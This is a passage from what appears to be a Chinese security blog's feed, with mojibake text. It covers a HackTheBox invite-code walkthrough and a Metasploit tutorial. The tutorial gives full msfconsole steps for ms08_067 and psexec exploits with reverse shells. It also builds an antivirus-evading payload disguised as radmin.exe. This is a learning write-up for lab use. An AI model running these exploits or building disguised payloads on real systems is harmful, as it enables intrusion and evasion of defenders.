title="0x11.æ¥ä¸‹æ¥å°±æ˜¯æ“¦å±è‚¡èµ°äººäº†ï¼Œå¹²ä¸åŠ¨äº†ã€‚ã€‚ã€‚"></a>0x11.æ¥ä¸‹æ¥å°±æ˜¯æ“¦å±è‚¡èµ°äººäº†ï¼Œå¹²ä¸åŠ¨äº†ã€‚ã€‚ã€‚</h2>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;0x00-å®˜ç½‘æè¿°&quot;&gt;&lt;a href=&quot;#0x00-å®˜ç½‘æè¿°&quot; class=&quot;headerlink&quot; title=&quot;0x00.å®˜ç½‘æè¿°&quot;&gt;&lt;/a&gt;0x00.å®˜ç½‘æè¿°&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;DC-1 is a purposely built vulnerable lab for the purpose of gaining experience in the world of penetration testing.&lt;/p&gt;
&lt;p&gt;It was designed to be a challenge for beginners, but just how easy it is will depend on your skills and knowledge, and your ability to learn.&lt;/p&gt;
&lt;p&gt;To successfully complete this challenge, you will require Linux skills, familiarity with the Linux command line and experience with basic penetration testing tools, such as the tools that can be found on Kali Linux, or Parrot Security OS.&lt;/p&gt;
&lt;p&gt;There are multiple ways of gaining root, however, I have included some flags which contain clues for beginners.&lt;/p&gt;
&lt;p&gt;There are five flags in total, but the ultimate goal is to find and read the flag in rootâ€™s home directory. You donâ€™t even need to be root to do this, however, you will require root privileges.&lt;/p&gt;
&lt;p&gt;Depending on your skill level, you may be able to skip finding most of these flags and go straight for root.&lt;/p&gt;
&lt;p&gt;Beginners may encounter challenges that they have never come across previously, but a Google search should be all that is required to obtain the information required to complete this challenge.&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="vulnhub" scheme="https://lunamoore.github.io/categories/vulnhub/"/>
    
    
    <category term="é¶æœº" scheme="https://lunamoore.github.io/tags/%E9%9D%B6%E6%9C%BA/"/>
    
  </entry>
  
  <entry>
    <title>HackTheBoxæ³¨å†Œ</title>
    <link href="https://lunamoore.github.io/2020/08/19/hackthebox%E6%B3%A8%E5%86%8C/"/>
    <id>https://lunamoore.github.io/2020/08/19/hackthebox%E6%B3%A8%E5%86%8C/</id>
    <published>2020-08-19T08:36:43.000Z</published>
    <updated>2020-08-19T12:00:20.998Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-å‰è¨€-ä»€ä¹ˆæ˜¯Hack-The-Box"><a href="#0x00-å‰è¨€-ä»€ä¹ˆæ˜¯Hack-The-Box" class="headerlink" title="0x00.å‰è¨€~ä»€ä¹ˆæ˜¯Hack The Box"></a>0x00.å‰è¨€~ä»€ä¹ˆæ˜¯Hack The Box</h2><blockquote><p>å®ƒåŸºæœ¬ä¸Šæ˜¯ä¸€ä¸ªåœ¨çº¿å¹³å°ï¼Œç”¨äºæµ‹è¯•å’Œå¢å¼ºä½ çš„æ¸—é€æµ‹è¯•å’Œç½‘ç»œå®‰å…¨æŠ€èƒ½ã€‚å®ƒåŒ…å«ä¸€äº›ä¸æ–­æ›´æ–°çš„æŒ‘æˆ˜ã€‚å…¶ä¸­ä¸€äº›æ¨¡æ‹Ÿäº†ç°å®ä¸–ç•Œçš„åœºæ™¯ï¼Œè€Œå¦ä¸€äº›åˆ™æ›´å€¾å‘äºCTFçš„æŒ‘æˆ˜é£æ ¼ã€‚å¦‚æœä½ å¯¹ç½‘ç»œå®‰å…¨æˆ–ä¿¡æ¯å®‰å…¨æ„Ÿå…´è¶£ï¼Œåˆ™åº”å°è¯•æ­¤ç«™ç‚¹ã€‚OKè®©æˆ‘ä»¬å¼€å§‹å§ï¼ï¼ï¼</p></blockquote><a id="more"></a><h2 id="0x01-é¦–å…ˆï¼Œè®¿é—®Hack-the-Boxç½‘ç«™ï¼Œå¹¶é˜…è¯»å…¶å¸¸è§é—®é¢˜è§£ç­”å’Œä¸€äº›å…¶ä»–æœ‰ç”¨çš„ä¸œè¥¿ã€‚"><a href="#0x01-é¦–å…ˆï¼Œè®¿é—®Hack-the-Boxç½‘ç«™ï¼Œå¹¶é˜…è¯»å…¶å¸¸è§é—®é¢˜è§£ç­”å’Œä¸€äº›å…¶ä»–æœ‰ç”¨çš„ä¸œè¥¿ã€‚" class="headerlink" title="0x01.é¦–å…ˆï¼Œè®¿é—®Hack the Boxç½‘ç«™ï¼Œå¹¶é˜…è¯»å…¶å¸¸è§é—®é¢˜è§£ç­”å’Œä¸€äº›å…¶ä»–æœ‰ç”¨çš„ä¸œè¥¿ã€‚"></a>0x01.é¦–å…ˆï¼Œè®¿é—®<span class="exturl" data-url="aHR0cHM6Ly93d3cuaGFja3RoZWJveC5ldS8=">Hack the Boxç½‘ç«™ï¼Œ<i class="fa fa-external-link-alt"></i></span>å¹¶é˜…è¯»å…¶å¸¸è§é—®é¢˜è§£ç­”å’Œä¸€äº›å…¶ä»–æœ‰ç”¨çš„ä¸œè¥¿ã€‚</h2><h2 id="0x02-ç³»ç»Ÿå°†æç¤ºæ‚¨è½¬åˆ°https-www-hackthebox-eu-é‚€è¯·åŠ å…¥HTBã€‚"><a href="#0x02-ç³»ç»Ÿå°†æç¤ºæ‚¨è½¬åˆ°https-www-hackthebox-eu-é‚€è¯·åŠ å…¥HTBã€‚" class="headerlink" title="0x02.ç³»ç»Ÿå°†æç¤ºæ‚¨è½¬åˆ°https://www.hackthebox.eu/é‚€è¯·åŠ å…¥HTBã€‚"></a>0x02.ç³»ç»Ÿå°†æç¤ºæ‚¨è½¬åˆ°<span class="exturl" data-url="aHR0cHM6Ly93d3cuaGFja3RoZWJveC5ldS9pbnZpdGU=">https://www.hackthebox.eu/<i class="fa fa-external-link-alt"></i></span>é‚€è¯·åŠ å…¥HTBã€‚</h2><h2 id="0x03-å½“æ‚¨è½¬åˆ°è¯¥é¡µé¢æ—¶ï¼Œå°†çœ‹åˆ°ä¸€ä¸ªæ–‡æœ¬æ¡†ï¼Œè®©ä½ è¾“å…¥é‚€è¯·ç ã€‚"><a href="#0x03-å½“æ‚¨è½¬åˆ°è¯¥é¡µé¢æ—¶ï¼Œå°†çœ‹åˆ°ä¸€ä¸ªæ–‡æœ¬æ¡†ï¼Œè®©ä½ è¾“å…¥é‚€è¯·ç ã€‚" class="headerlink" title="0x03.å½“æ‚¨è½¬åˆ°è¯¥é¡µé¢æ—¶ï¼Œå°†çœ‹åˆ°ä¸€ä¸ªæ–‡æœ¬æ¡†ï¼Œè®©ä½ è¾“å…¥é‚€è¯·ç ã€‚"></a>0x03.å½“æ‚¨è½¬åˆ°è¯¥é¡µé¢æ—¶ï¼Œå°†çœ‹åˆ°ä¸€ä¸ªæ–‡æœ¬æ¡†ï¼Œè®©ä½ è¾“å…¥<em>é‚€è¯·ç </em>ã€‚</h2><h3 id="01-æ ¹æ®æç¤ºæ‰“å¼€æ§åˆ¶å°"><a href="#01-æ ¹æ®æç¤ºæ‰“å¼€æ§åˆ¶å°" class="headerlink" title="01.æ ¹æ®æç¤ºæ‰“å¼€æ§åˆ¶å°"></a>01.æ ¹æ®æç¤ºæ‰“å¼€æ§åˆ¶å°</h3><img src="/2020/08/19/hackthebox%E6%B3%A8%E5%86%8C/image-20200819155151668.png" class><h3 id="02-æ ¹æ®æç¤ºç»§ç»­"><a href="#02-æ ¹æ®æç¤ºç»§ç»­" class="headerlink" title="02.æ ¹æ®æç¤ºç»§ç»­"></a>02.æ ¹æ®æç¤ºç»§ç»­</h3><p><code>æŒ‘æˆ˜ç¬¬ä¸€æ­¥ï¼Œæ­¤é¡µé¢åŠ è½½ä¸€ä¸ªæœ‰è¶£çš„javascriptæ–‡ä»¶ã€‚çœ‹çœ‹ä½ èƒ½ä¸èƒ½æ‰¾åˆ°å®ƒï¼š</code></p><img src="/2020/08/19/hackthebox%E6%B3%A8%E5%86%8C/image-20200819155456002.png" class><h3 id="03-å‘ç°é‚€è¯·æ¥å£çš„jsæ–‡ä»¶"><a href="#03-å‘ç°é‚€è¯·æ¥å£çš„jsæ–‡ä»¶" class="headerlink" title="03.å‘ç°é‚€è¯·æ¥å£çš„jsæ–‡ä»¶"></a>03.å‘ç°é‚€è¯·æ¥å£çš„jsæ–‡ä»¶</h3><img src="/2020/08/19/hackthebox%E6%B3%A8%E5%86%8C/image-20200819155754688.png" class><h3 id="04-å³é”®æ‰“å¼€ï¼Œå‘ç°åˆ¶é€ é‚€è¯·ç å‡½æ•°"><a href="#04-å³é”®æ‰“å¼€ï¼Œå‘ç°åˆ¶é€ é‚€è¯·ç å‡½æ•°" class="headerlink" title="04.å³é”®æ‰“å¼€ï¼Œå‘ç°åˆ¶é€ é‚€è¯·ç å‡½æ•°"></a>04.å³é”®æ‰“å¼€ï¼Œå‘ç°åˆ¶é€ é‚€è¯·ç å‡½æ•°</h3><img src="/2020/08/19/hackthebox%E6%B3%A8%E5%86%8C/image-20200819155903977.png" class><h3 id="05-åœ¨æ§åˆ¶å°è°ƒç”¨"><a href="#05-åœ¨æ§åˆ¶å°è°ƒç”¨" class="headerlink" title="05.åœ¨æ§åˆ¶å°è°ƒç”¨"></a>05.åœ¨æ§åˆ¶å°è°ƒç”¨</h3><p><code>å¯ä»¥çœ‹åˆ°200çŠ¶æ€ç ï¼Œå¯ä»¥çœ‹åˆ°dataä¸ºåŠ å¯†ä¸ºROT13(æœ‰æ—¶ä¹Ÿä¸ºbase64)</code></p><img src="/2020/08/19/hackthebox%E6%B3%A8%E5%86%8C/image-20200819160416212.png" class><h3 id="06-è§£å¯†"><a href="#06-è§£å¯†" class="headerlink" title="06.è§£å¯†"></a>06.è§£å¯†</h3><p><code>å‘ç°è¦å‘é€POSTè¯·æ±‚</code></p><img src="/2020/08/19/hackthebox%E6%B3%A8%E5%86%8C/image-20200819160919218.png" class><h3 id="07-å‘é€POSTè¯·æ±‚"><a href="#07-å‘é€POSTè¯·æ±‚" class="headerlink" title="07.å‘é€POSTè¯·æ±‚"></a>07.å‘é€POSTè¯·æ±‚</h3><p><code>å¾—åˆ°ä»¥=ç»“å°¾çš„æ•°æ®ï¼ŒçŒœæµ‹ä¸ºbase64</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SlpYQkMtRkVBWUktWkhWQ1AtRkhTU0gtS0xEVFQ=</span><br></pre></td></tr></table></figure><img src="/2020/08/19/hackthebox%E6%B3%A8%E5%86%8C/image-20200819161940343.png" class><h3 id="08-è§£ç "><a href="#08-è§£ç " class="headerlink" title="08.è§£ç "></a>08.è§£ç </h3><p><code>å¾—åˆ°é‚€è¯·ç </code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">JZXBC-FEAYI-ZHVCP-FHSSH-KLDTT</span><br></pre></td></tr></table></figure><img src="/2020/08/19/hackthebox%E6%B3%A8%E5%86%8C/image-20200819162456042.png" class><h3 id="09-ä¹‹åå°±å¯ä»¥æ„‰å¿«çš„ç©è€äº†"><a href="#09-ä¹‹åå°±å¯ä»¥æ„‰å¿«çš„ç©è€äº†" class="headerlink" title="09.ä¹‹åå°±å¯ä»¥æ„‰å¿«çš„ç©è€äº†"></a>09.ä¹‹åå°±å¯ä»¥æ„‰å¿«çš„ç©è€äº†</h3><p><code>æ ¹æ®æç¤ºè¿›è¡Œè¿æ¥å³å¯</code></p><img src="/2020/08/19/hackthebox%E6%B3%A8%E5%86%8C/image-20200819195715615.png" class><p><code>ä¸‹å›¾ä¸ºè¿æ¥æˆåŠŸçŠ¶æ€</code></p><img src="/2020/08/19/hackthebox%E6%B3%A8%E5%86%8C/image-20200819195817627.png" class>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;0x00-å‰è¨€-ä»€ä¹ˆæ˜¯Hack-The-Box&quot;&gt;&lt;a href=&quot;#0x00-å‰è¨€-ä»€ä¹ˆæ˜¯Hack-The-Box&quot; class=&quot;headerlink&quot; title=&quot;0x00.å‰è¨€~ä»€ä¹ˆæ˜¯Hack The Box&quot;&gt;&lt;/a&gt;0x00.å‰è¨€~ä»€ä¹ˆæ˜¯Hack The Box&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;å®ƒåŸºæœ¬ä¸Šæ˜¯ä¸€ä¸ªåœ¨çº¿å¹³å°ï¼Œç”¨äºæµ‹è¯•å’Œå¢å¼ºä½ çš„æ¸—é€æµ‹è¯•å’Œç½‘ç»œå®‰å…¨æŠ€èƒ½ã€‚å®ƒåŒ…å«ä¸€äº›ä¸æ–­æ›´æ–°çš„æŒ‘æˆ˜ã€‚å…¶ä¸­ä¸€äº›æ¨¡æ‹Ÿäº†ç°å®ä¸–ç•Œçš„åœºæ™¯ï¼Œè€Œå¦ä¸€äº›åˆ™æ›´å€¾å‘äºCTFçš„æŒ‘æˆ˜é£æ ¼ã€‚å¦‚æœä½ å¯¹ç½‘ç»œå®‰å…¨æˆ–ä¿¡æ¯å®‰å…¨æ„Ÿå…´è¶£ï¼Œåˆ™åº”å°è¯•æ­¤ç«™ç‚¹ã€‚OKè®©æˆ‘ä»¬å¼€å§‹å§ï¼ï¼ï¼&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="HackTheBox" scheme="https://lunamoore.github.io/categories/HackTheBox/"/>
    
    
    <category term="é¶æœº" scheme="https://lunamoore.github.io/tags/%E9%9D%B6%E6%9C%BA/"/>
    
  </entry>
  
  <entry>
    <title>MSFçš„ç®€å•æ“ä½œ</title>
    <link href="https://lunamoore.github.io/2020/08/18/MSF%E7%9A%84%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C/"/>
    <id>https://lunamoore.github.io/2020/08/18/MSF%E7%9A%84%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C/</id>
    <published>2020-08-18T07:47:41.000Z</published>
    <updated>2020-08-18T10:27:30.144Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x01-å†™åœ¨å‰é¢"><a href="#0x01-å†™åœ¨å‰é¢" class="headerlink" title="0x01.å†™åœ¨å‰é¢"></a>0x01.å†™åœ¨å‰é¢</h1><blockquote><p><strong>Metasploité¡¹ç›®</strong>æ˜¯ä¸€ä¸ªæ—¨åœ¨æä¾›å®‰å…¨æ¼æ´ä¿¡æ¯è®¡ç®—æœºå®‰å…¨é¡¹ç›®ï¼Œå¯ä»¥ååŠ©å®‰å…¨å·¥ç¨‹å¸ˆè¿›è¡Œæ¸—é€æµ‹è¯•åŠå…¥ä¾µæ£€æµ‹ç³»ç»Ÿ]ç­¾åå¼€å‘ã€‚metspolitæ¡†æ¶å…±æœ‰å››ä¸ªç‰ˆæœ¬ï¼ˆMetasploit Framework Editionï¼ŒMetasploit Community Editionï¼ŒMetasploit Expressï¼ŒMetasploit Proï¼‰ï¼ŒMSFä¸ºå…¶ä¸­çš„å¼€æºå…è´¹ç‰ˆæœ¬ï¼Œå…¶ä»–ä¸ºæ”¶è´¹ç‰ˆæœ¬ï¼Œä½†åŠŸèƒ½ä¹Ÿæ›´åŠ å¼ºå¤§ã€‚æœ€æ–°çš„MSFä¸ºMSF5.0ï¼Œ5.0æä¾›äº†æ–°çš„æ•°æ®æœåŠ¡ï¼Œå¼•å…¥äº†æ–°çš„å…æ€åŠŸèƒ½ï¼Œæ”¯æŒå¤šç§è¯­è¨€ã€‚</p></blockquote><p><strong>å…è´£å£°æ˜ï¼šæœ¬æ–‡åªä¸ºå­¦ä¹ è®°å½•ï¼Œä»»ä½•äººéæ³•ä½¿ç”¨äº§ç”Ÿçš„ä»»ä½•åæœï¼Œä½œè€…æ¦‚ä¸è´Ÿè´£ï¼ï¼ï¼</strong></p><a id="more"></a><h2 id="ä¸€ã€MSF5çš„7å¤§æ¨¡å—"><a href="#ä¸€ã€MSF5çš„7å¤§æ¨¡å—" class="headerlink" title="ä¸€ã€MSF5çš„7å¤§æ¨¡å—"></a>ä¸€ã€MSF5çš„7å¤§æ¨¡å—</h2><hr><h3 id="1-auxiliary"><a href="#1-auxiliary" class="headerlink" title="1.auxiliary"></a>1.auxiliary</h3><blockquote><p>è´Ÿè´£æ‰§è¡Œä¿¡æ¯æ”¶é›†ã€æ‰«æã€å—…æ¢ã€æŒ‡çº¹è¯†åˆ«ã€å£ä»¤çŒœæµ‹å’ŒDosæ”»å‡»ç­‰åŠŸèƒ½çš„è¾…åŠ©æ¨¡å—</p></blockquote><h3 id="2-exploits"><a href="#2-exploits" class="headerlink" title="2.exploits"></a>2.exploits</h3><blockquote><p>åˆ©ç”¨ç³»ç»Ÿæ¼æ´è¿›è¡Œæ”»å‡»çš„åŠ¨ä½œï¼Œæ­¤æ¨¡å—å¯¹åº”æ¯ä¸€ä¸ªå…·ä½“æ¼æ´çš„æ”»å‡»æ–¹æ³•ï¼ˆä¸»åŠ¨ã€è¢«åŠ¨ï¼‰ </p></blockquote><h3 id="3-payloads"><a href="#3-payloads" class="headerlink" title="3.payloads"></a>3.payloads</h3><blockquote><p>æˆåŠŸexploitä¹‹åï¼ŒçœŸæ­£åœ¨ç›®æ ‡ç³»ç»Ÿæ‰§è¡Œçš„ä»£ç æˆ–æŒ‡ä»¤ã€‚åˆ†ä¸º3ç§ç±»å‹çš„payloadï¼Œåˆ†åˆ«æ˜¯singleã€stageså’Œstagersã€‚shellcodeæ˜¯ç‰¹æ®Šçš„payloadï¼Œç”¨äºæ‹¿shellã€‚</p><p>singleï¼šä¸€ä¸ªå®Œæ•´çš„payloadï¼Œä¸éœ€è¦å¤–éƒ¨åº“ï¼Œall-in-one</p><p>stagerï¼šç›®æ ‡è®¡ç®—æœºå†…å­˜æœ‰é™ï¼Œå…ˆä¼ è¾“ä¸€ä¸ªè¾ƒå°çš„payloadç”¨äºå»ºç«‹è¿æ¥</p><p>stagesï¼šåˆ©ç”¨stagerå»ºç«‹çš„è¿æ¥ä¸‹è½½åç»­çš„payload</p><p>stagerä¸stagesæœ‰å¤šç§ç±»å‹ï¼Œé€‚ç”¨äºä¸åŒåœºæ™¯</p></blockquote><h3 id="4-encoders"><a href="#4-encoders" class="headerlink" title="4.encoders"></a>4.encoders</h3><blockquote><p>å¯¹payloadè¿›è¡ŒåŠ å¯†ï¼Œèº²é¿Anti Virusæ£€æŸ¥çš„æ¨¡å—</p></blockquote><h3 id="5-nops"><a href="#5-nops" class="headerlink" title="5.nops"></a>5.nops</h3><blockquote><p>æé«˜payloadç¨³å®šæ€§åŠç»´æŒå¤§å°ã€‚åœ¨æ¸—é€æ”»å‡»æ„é€ æ¶æ„æ•°æ®ç¼“å†²åŒºæ—¶ï¼Œå¸¸å¸¸è¦åœ¨çœŸæ­£è¦æ‰§è¡Œçš„Shellcodeä¹‹å‰æ·»åŠ ä¸€æ®µç©ºæŒ‡ä»¤åŒºï¼Œ è¿™æ ·å½“è§¦å‘æ¸—é€æ”»å‡»åè·³è½¬æ‰§è¡ŒShellcodeæ—¶ï¼Œæœ‰ä¸€ä¸ªè¾ƒå¤§çš„å®‰å…¨ç€é™†åŒºï¼Œä»è€Œé¿å…å—åˆ°å†…å­˜åœ°å€éšæœºåŒ–ã€è¿”å›åœ°å€è®¡ç®—åå·®ç­‰åŸå› é€ æˆçš„Shellcodeæ‰§è¡Œå¤±è´¥ï¼Œæé«˜æ¸—é€æ”»å‡»çš„å¯é æ€§ã€‚</p></blockquote><h3 id="6-post"><a href="#6-post" class="headerlink" title="6.post"></a>6.post</h3><blockquote><p>åæœŸæ¸—é€æ¨¡å—ã€‚åœ¨å–å¾—ç›®æ ‡ç³»ç»Ÿè¿œç¨‹æ§åˆ¶æƒåï¼Œè¿›è¡Œä¸€ç³»åˆ—çš„åæ¸—é€æ”»å‡»åŠ¨ä½œï¼Œå¦‚è·å–æ•æ„Ÿä¿¡æ¯ã€è·³æ¿æ”»å‡»ç­‰æ“ä½œ </p></blockquote><h3 id="7-evasion"><a href="#7-evasion" class="headerlink" title="7.evasion"></a>7.evasion</h3><blockquote><p>ç”¨äºå…æ€ç»•è¿‡</p></blockquote><h2 id="äºŒã€msfconsoleæ§åˆ¶å°"><a href="#äºŒã€msfconsoleæ§åˆ¶å°" class="headerlink" title="äºŒã€msfconsoleæ§åˆ¶å°"></a>äºŒã€msfconsoleæ§åˆ¶å°</h2><p>ä¸€èˆ¬å‚æ•°</p><blockquote><p>msfconsole -h    æŸ¥çœ‹å¸®åŠ©ä¿¡æ¯</p><p>msfconsole -q    å®‰é™å¯åŠ¨</p></blockquote><p>ä¸€èˆ¬å‘½ä»¤</p><blockquote><p>banner    bannerä¿¡æ¯</p><p>color    é¢œè‰²è®¾ç½®</p><p>connect    è¿æ¥è®¾ç½®</p></blockquote><p>æ§åˆ¶å°å¸¸ç”¨å‘½ä»¤</p><blockquote><p>show æ¨¡å—    æŸ¥çœ‹æ¨¡å—ä¿¡æ¯</p><p>search å‚æ•°    æŸ¥æ‰¾æŒ‡å®šä¿¡æ¯ã€‚ä¾‹å¦‚ï¼šsearch name:mysql</p><p>use æŒ‡å®šæ–‡ä»¶    ä½¿ç”¨æŒ‡å®šæ–‡ä»¶ã€‚ä¾‹å¦‚ï¼šuse exploit/windows/smb/ms08_067_netapi</p><p>åœ¨useä¸‹å¯ä»¥æŸ¥çœ‹infoä¿¡æ¯ï¼ŒæŸ¥çœ‹å½“å‰expä¸‹å¯ä»¥ä½¿ç”¨çš„payloadã€ç³»ç»Ÿç­‰ä¿¡æ¯ã€‚</p><p>åœ¨useä¸‹ä¹Ÿå¯ä»¥ä½¿ç”¨show missingæŸ¥çœ‹éœ€è¦é…ç½®çš„å‚æ•°ï¼Œshow optionsæŸ¥çœ‹é…ç½®çš„å‚æ•°ï¼Œshow targetsæŸ¥çœ‹å¯ä»¥åˆ©ç”¨çš„å¯¹è±¡ï¼Œshow advancedæŸ¥çœ‹é«˜çº§é…ç½®å‚æ•°ï¼Œshow evasionæŸ¥çœ‹é¢çº±ç»•è¿‡ä¿¡æ¯</p><p>set/unset    ç”¨äºè®¾ç½®</p><p>setg/unsetg    å…¨å±€è®¾ç½®ï¼Œä»…åœ¨å½“å‰ä¼šè¯æœ‰æ•ˆï¼Œé€€å‡ºå¤±æ•ˆï¼Œå¯ä»¥ä½¿ç”¨saveä¿å­˜</p><p>check    ç”¨äºæµ‹è¯•æ˜¯å¦å¯ä»¥åˆ©ç”¨</p><p>back    è¿”å›ä¸Šä¸€çº§</p><p>db_    ä¸€ç³»åˆ—å‚æ•°</p><p>hosts    æŸ¥çœ‹ä¸»æœºå‚æ•°</p><p>hosts -c    æŸ¥çœ‹æŒ‡å®šåˆ—</p><p>hosts -S    ä»¥æŒ‡å®šå‚æ•°æœç´¢</p><p>services    æŸ¥çœ‹ç«¯å£ç­‰ï¼ˆ-S/-cï¼‰</p><p>run    æ‰§è¡Œå½“å‰æ¨¡å—</p><p>load    å¯¼å…¥å¤–éƒ¨æ¨¡å—</p><p>resource    æŒ‡å®šèµ„æºæ–‡ä»¶    æ–‡ä»¶å.rcï¼Œå°†é…ç½®ç›´æ¥å†™å…¥.rcï¼Œmsfconsole -r æ–‡ä»¶å.rc</p></blockquote><p>ä¸€ä¸ªåå¼¹shellå°æ¡ˆä¾‹ï¼Œæœ¬æ¬¡åˆ©ç”¨ms08_067</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/smb/ms08_067_netapi</span><br><span class="line">show options</span><br><span class="line">set payload windows/shell/reverse_tcp</span><br><span class="line">set rhost 192.168.1.200</span><br><span class="line">set lhost 192.168.1.6</span><br><span class="line">set target 34</span><br><span class="line">run -j</span><br><span class="line">sessions -l</span><br><span class="line">sessions -i 1</span><br></pre></td></tr></table></figure><img src="/2020/08/18/MSF%E7%9A%84%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C/image-20200626115208454.png" class><h2 id="ä¸‰ã€å®éªŒæ¡ˆä¾‹"><a href="#ä¸‰ã€å®éªŒæ¡ˆä¾‹" class="headerlink" title="ä¸‰ã€å®éªŒæ¡ˆä¾‹"></a>ä¸‰ã€å®éªŒæ¡ˆä¾‹</h2><h3 id="1-active-exploitä¸PassiveMoudleæ¡ˆä¾‹"><a href="#1-active-exploitä¸PassiveMoudleæ¡ˆä¾‹" class="headerlink" title="(1)active exploitä¸PassiveMoudleæ¡ˆä¾‹"></a>(1)active exploitä¸PassiveMoudleæ¡ˆä¾‹</h3><p>ActiveModule</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">search smb/psexec</span><br><span class="line">use exploit/windows/smb/psexec</span><br><span class="line">search shell/reverse</span><br><span class="line">set payload payload/windows/shell/reverse_tcp</span><br><span class="line">set rhosts 192.168.1.100</span><br><span class="line">set lhost 192.168.1.6</span><br><span class="line">set SMBUSER administrator</span><br><span class="line">set SMBPASS 11</span><br><span class="line">show options</span><br><span class="line">show targets</span><br><span class="line">run -j</span><br><span class="line">sessions -l</span><br><span class="line">sessions -i 1</span><br></pre></td></tr></table></figure><p>PassiveMoudle</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">search windows/browser/ms07_017_ani_loadimage_chunksize</span><br><span class="line">use windows/browser/ms07_017_ani_loadimage_chunksize</span><br><span class="line">set payload payload/windows/shell/reverse_tcp</span><br><span class="line">set lhost 192.168.1.6</span><br><span class="line">set srvhost 192.168.1.6</span><br><span class="line">run # ç­‰å¾…è®¿é—®å³å¯</span><br></pre></td></tr></table></figure><h3 id="ï¼ˆ2ï¼‰ç”Ÿæˆpayloadæ¡ˆä¾‹"><a href="#ï¼ˆ2ï¼‰ç”Ÿæˆpayloadæ¡ˆä¾‹" class="headerlink" title="ï¼ˆ2ï¼‰ç”Ÿæˆpayloadæ¡ˆä¾‹"></a>ï¼ˆ2ï¼‰ç”Ÿæˆpayloadæ¡ˆä¾‹</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">use windows/shell_bind_tcp</span><br><span class="line">generate # ç¼–ç </span><br><span class="line">generate -b &#x27;\x00&#x27; # è¿‡æ»¤åå­—ç¬¦</span><br><span class="line">-e x86/shikata_ga_nai # æŒ‡å®šç¼–ç </span><br><span class="line">-i 5 # æŒ‡å®šç¼–ç æ¬¡æ•°</span><br><span class="line">-k # ä½¿ç”¨å½“å‰è¿›ç¨‹ï¼Œå¼€å¯ä¸€ä¸ªæ–°çš„çº¿ç¨‹</span><br><span class="line">-x /usr/share/windows-binaries/radmin.exe # ä½¿ç”¨ä¸€ä¸ªæ­£å¸¸çš„æ¨¡æ¿</span><br><span class="line">-f exe # è¾“å‡ºæŒ‡å®šæ ¼å¼æ–‡ä»¶</span><br><span class="line">-o /root/1.exe # è¾“å‡ºæ–‡ä»¶çš„åå­—</span><br><span class="line">-n 14 # æ·»åŠ 14ä¸ªå­—èŠ‚çš„NOP,NOPæ˜¯æ— ä»»ä½•æ“ä½œå­—ç¬¦ï¼Œå¯ä»¥èµ·åˆ°æ··æ·†ç»•è¿‡å…æ€çš„ä½œç”¨</span><br></pre></td></tr></table></figure><p>å°æ¡ˆä¾‹ï¼Œç”Ÿæˆä¸€ä¸ªä¼ªé€ çš„è¿œç¨‹ç®¡ç†å°ç¨‹åº</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">generate -b &#x27;\x00\xff&#x27; -e x86/shikata_ga_nai -i 5 -k -x /usr/share/windows-binaries/radmin.exe -f exe -o /root/1.exe</span><br></pre></td></tr></table></figure><p>æ‰§è¡Œ</p><img src="/2020/08/18/MSF%E7%9A%84%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C/image-20200624191334844.png" class><p>ncï¼Œgetshell</p><img src="/2020/08/18/MSF%E7%9A%84%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C/image-20200624191426746.png" class><h2 id="å››ã€meterpreterï¼Œæ³¨å…¥åˆ°åˆæ³•çš„æ“ä½œç³»ç»Ÿé‡Œçš„è¿›ç¨‹ï¼Œéšæœºã€‚"><a href="#å››ã€meterpreterï¼Œæ³¨å…¥åˆ°åˆæ³•çš„æ“ä½œç³»ç»Ÿé‡Œçš„è¿›ç¨‹ï¼Œéšæœºã€‚" class="headerlink" title="å››ã€meterpreterï¼Œæ³¨å…¥åˆ°åˆæ³•çš„æ“ä½œç³»ç»Ÿé‡Œçš„è¿›ç¨‹ï¼Œéšæœºã€‚"></a>å››ã€meterpreterï¼Œæ³¨å…¥åˆ°åˆæ³•çš„æ“ä½œç³»ç»Ÿé‡Œçš„è¿›ç¨‹ï¼Œéšæœºã€‚</h2><p>1.meterpreter shell æ¡ˆä¾‹</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">search 